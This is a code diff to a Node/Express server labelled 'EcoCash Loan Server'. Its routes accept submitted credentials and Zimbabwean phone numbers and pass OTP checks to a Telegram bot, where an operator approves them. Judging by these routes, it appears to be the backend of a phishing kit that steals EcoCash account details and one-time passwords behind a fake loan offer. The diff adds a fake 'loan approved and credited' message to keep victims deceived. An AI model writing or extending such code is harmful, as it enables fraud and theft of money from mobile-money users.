@@ -33,7 +33,6 @@ app.post('/api/submit-credentials', async (req, res) => {
     const data = req.body;
     const formattedPhone = formatZimbabwePhone(data.phone);
     
-    // Validate EcoCash prefixes (+263 77 / +263 78)
     if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {
       return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });
     }
@@ -159,7 +158,7 @@ app.get('/api/check-status/:appReference', (req, res) => {
   res.json({ success: true, status: appData.status });
 });
 
-// Telegram Webhook Handler (/start command + callback buttons)
+// Telegram Webhook Handler
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -220,7 +219,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: OTP Verified as CORRECT ✅</b>\n\n🎉 <b>Congratulations! Your loan request has been successfully approved and credited to your EcoCash account.</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -255,4 +254,3 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-      
